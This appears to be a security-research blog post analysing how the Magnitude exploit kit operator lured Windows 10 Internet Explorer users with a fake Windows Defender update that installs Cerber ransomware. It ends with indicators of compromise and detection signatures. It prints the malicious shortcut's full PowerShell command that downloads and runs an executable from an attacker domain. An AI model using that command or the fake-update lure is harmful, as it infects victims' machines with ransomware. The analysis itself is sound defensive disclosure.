@@ -1,0 +1,142 @@
+Magnitude Actor Adds a Social Engineering Scheme for Windows 10
+Introduction: 
+While exploit kit (EK) activity declined dramatically in 2016, we continue to see innovation and new additions to the space. An established player, Magnitude EK has been in operation for several years and last year we identified a new Flash vulnerability that appeared in the exploit kit. However, as in the broader threat landscape, we are beginning to see social engineering, rather than traditional exploits, appearing in conjunction with EKs, including Magnitude.
+For some time now, Magnitude EK [1] appears to have been running in private mode; that is, threat actors are not renting access to the kit to distribute malware. Since September 2016, the actor behind Magnitude shifted focus to Asia, almost exclusively distributing Cerber in Korea and Taiwan (Figure 1).
+ 
+Figure 1: Illustration of tracked Magnitude activity in the last nine months.
+As shown in Figure 1, Magnitude is being fed by malvertising traffic funneled through two-step filtering redirectors that allow targeting based on geography, user agent, and Internet service provider. We refer to this filtering and redirection instance as "Magnigate". Users who encounter the malvertising but who are not targeted are instead presented with a decoy website (Figure 2).
+
+Figure 2: Examples of templates used for decoy websites at the first filtering step
+Figure 3 shows the normal redirection to Magnitude; this traffic was recorded on March 6. Now, however, we have observed the chain redirecting Internet Explorer users on Windows 10 to a social engineering scheme.
+
+Figure 3: Magnigate into Magnitude into Cerber in Korea - March 6, 2017
+Overview:
+The animation in Figure 4 provides the end user view of the social engineering attack on Windows 10 Internet Explorer users. Targeted web surfers receive a message that Windows Defender virus and spyware definitions could not be updated, and are led through a series of actions that ultimately results in Cerber ransomware infection.
+
+Figure 4:  Animation of “Windows Defender Critical Update” social Engineering used by Magnitude actors - March 01, 2017
+Attack chain and analysis:
+Figure 5 illustrates the basic attack chain experienced by targeted Windows 10 users of Microsoft Internet Explorer 11. 
+Figure 5: Attack chain showing both English and Korean thumbnails of the social engineering alerts presented to users of Microsoft Internet Explorer 11 on Microsoft Windows 10
+Figures 6 and 7 show the fake Windows Defender application window and error message displayed to Internet Explorer users in Korean and English, respectively.
+
+Figure 6: Korean-language alert window allowing users to download and install a bogus Windows Defender update.
+
+Figure 7: English-language version of the fake Windows Defender alert
+The landing of the social engineering scheme uses code [3] from Manuel Caballero's (@magicmac2000) “Abusing of Protocols to Load Local Files, bypass the HTML5 Sandbox, Open Popups and more”. The rationale behind several of the implementation decisions made by the Magnitude actor are unclear. We will not speculate on further details here; the landing page code as it stands is shown in Figure 8.
+
+Figure 8: Landing page code for the social engineering alerts
+Regardless of whether users click "OK", "Cancel", or attempt to exit the “Windows Defender Fatal Error!” dialog shown in Figures 6 and 7, a prompt to open Microsoft Edge.app is always displayed (Figure 9).
+
+Figure 9: Prompt to open Microsoft Edge
+This dialog also cannot be closed; users may only click "Allow" which launches Microsoft Edge. When launched in this manner, though, bypasses the HTML5 sandbox and the browser displays the message in Figure 10:
+
+Figure 10: Microsoft Edge prompt
+This additional dialog is likely intended to prepare the user for the next step, a classic “save and execute” scheme (Figure 11):
+
+Figure 11: English and Korean prompts to download the fake update. These prompts mimic a legitimate Windows Defender definition update error.
+When we first observed this chain, we were also presented with a Windows SmartScreen error. However, this dialog has since been removed and users no longer receive the alert shown in Figure 12.
+
+Figure 12: Windows SmartScreen error; this step in the scheme is no longer present and appears to have been removed the day after we discovered the attack chain.
+Once victims click "Download update" they are presented with a download dialog in which they must both save and update the fake definition file. The English variant of the dialog is shown in Figure 13.
+
+Figure 13: English variant of the download dialog for the fake Windows Defender update observe in Taiwan and China
+Figure 14 shows the final standard Windows security warning for opening downloaded files when users click "Open" in the dialog above.
+
+Figure 14: Final security warning presented to victims who download the fake update file.
+The downloaded file is in fact a shortcut containing Windows PowerShell commands to download and execute Cerber malware. Figure 15 shows the file properties for the shortcut.
+
+Figure 15: Shortcut containing Powershell commands to download and execute Cerber
+The complete PowerShell command appears below:
+C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy ByPass -NoProfile -command  function D($U){$D=New-Object System.Net.WebClient;$D.DownloadFile($U,'ubg56rybh.exe');}D('http[://]winupdate[.]center/database'); & "ubg56rybh.exe"
+At this point, users are infected with Cerber ransomware and are presented with the ransom note in Figures 16 and 17.
+
+Figure 16: Cerber ransom note (HTML)
+
+Figure 17: Cerber ransom note (image file)
+To summarize, the infection chain can be broken down into 4 basic components:
+For clients that are redirected to the social engineering :
+Conclusion
+While the social engineering scheme outlined here lacks the refinement of others we have observed in email distribution, the addition of a social engineering attack chain to a major exploit kit is noteworthy. Exploit kit traffic has declined substantially for a variety of reasons, including the difficulty of finding active, unpatched zero-days that can be exploited for long enough to justify investments in developing the exploits. Social engineering approaches, though, make active exploits less important and, instead, exploit users to click, bypass sandboxes, run PowerShell code, and otherwise infect their own systems on behalf of attackers.
+References :
+[1] http://malware.dontneedcoffee.com/2013/10/Magnitude.html
+[2] http://blog.spiderlabs.com/2014/08/a-peek-into-the-lions-den-the-magnitude-aka-popads-exploit-kit.html
+[3] https://www.brokenbrowser.com/abusing-of-protocols/ 2016-10-25
+Other References :
+https://www.proofpoint.com/us/threat-insight/post/killing-zero-day-in-the-egg
+https://www.proofpoint.com/us/threat-insight/post/Too-Many-Crooks-in-the-Kitchen
+https://blog.malwarebytes.com/cybercrime/2016/04/magnitude-ek-malvertising-campaign-adds-fingerprinting-gate/
+https://labsblog.f-secure.com/2016/03/07/ad-serving-platform-used-by-pua-also-delivers-magnitude-exploit-kit/
+https://blog.malwarebytes.org/malvertising-2/2016/01/malvertising-campaign-via-pop-under-ads-sends-cryptowall-4/
+Indicators of Compromise:
+Domain | IP
+Comment
+truegamez.biz|178.32.193.48
+Magnigate Filtering step1  2017-03-01
+sextizer.net|46.165.246.77
+Magnigate Filtering step1  2017-01-19
+44n786rdl6vdx.secdefender.online|89.163.131.195
+SocEng 2017-03-06
+e63405d9.fitsby.shopping|178.32.118.82
+Magnigate Filtering step 2 2017-03-06
+afm5d380s5if13crb0q.bluerow.shopping|178.32.118.82
+Magnigate Filtering step2 2017-03-04
+top2btc.com|62.210.56.102
+Magnigate Filtering step1 2017-03-04
+095ya7fa9d793.liveup.ltd|178.32.118.82
+Magnigate Filtering step2 2017-03-04
+61c48s0dei6o6cq08.windefender.stream|89.163.131.195
+SocEng 2017-03-04
+windefender.stream|89.163.131.195
+SocEng Payload  2017-03-04
+94e753od3l.defupdate.cloud|89.163.131.153
+SocEng  2017-03-03
+defupdate.cloud|89.163.131.153
+SocEng Payload  2017-03-03
+afm5d380s5if13crb0q.bluerow.shopping|178.32.118.82
+Magnigate Filtering step2 2017-03-03
+fa58j46co92.addout.date|91.134.247.212
+Magnitude 2017-03-01
+b2dy268m1acf.wonboxs.com|178.32.118.109
+Magnigate Filtering step2 2017-03-01
+794aj34d248r12k8t.winupdate.center|89.163.131.153
+			 
+SocEng 2017-03-01
+winupdate.center|89.163.131.153
+SocEng Payload 2017-03-01
+cb8cq3ta17uah587z.offeven.date|91.134.247.201
+Magnitude 2017-03-01
+bca2fr28l9ib5l.bosmran.com|178.32.118.109
+Magnigate Filtering step2 2017-03-01
+5b24e0ddav82h00by.filldo.party|94.23.170.83
+Magnitude 2017-02-19
+gamegeman.org|149.202.112.72
+Magnigate Filtering step1 2017-02-19
+58navawa89383pd7u.rawkis.com|178.32.119.43
+Magnigate Filtering step2 2017-02-19
+bwf221nehe0c.quitein.science|51.254.105.32
+Magnitude 2017-02-14
+neverlandjoys.net|212.48.90.99
+Magnigate Filtering step1 2017-02-14
+b6z445y8j4e3cb.ibequal.com|85.25.105.90
+Magnigate Filtering step2 2017-02-14
+accumulatortube.org|192.133.137.127
+Magnigate 2013-08-31
+ 
+sha256
+Comment
+0241fe37a2505f296734945962b67e471e8c7f2de591ba5f8dd9316436c9975e
+Slightly edited (anon) pcap
+131c7bb7419c7cf209ba68c0079a7f0063ec3ddede18bde99bd67e4a1187dd65
+Cerber 00803 2017-03-04 (soceng)
+3b629e62a994789e1a3ae13f26bf1fde5450cbd52a3041828b576483776baed8
+Cerber 00803 2017-03-04 (soceng)
+00ed8b12c385b27e348739f33c7342b8f749dc0a78790b4112a53465b169c0bb
+Cerber 05029 2017-03-01 (Magnitude)
+Select ET Signatures that would fire on such traffic:
+2824440 || ETPRO CURRENT_EVENTS Magnitude EK Redirect Jan 15 2017
+2825195 || ETPRO CURRENT_EVENTS Magnitude EK Soc Eng Mar 01 2017 M2
+2825194 || ETPRO CURRENT_EVENTS Magnitude EK Soc Eng Mar 01 2017 M1
+2020987 || ET CURRENT_EVENTS Download file with Powershell via LNK file (observed in Sundown EK)
+2000419 || ET POLICY PE EXE or DLL Windows file download
+2016538 || ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
+--
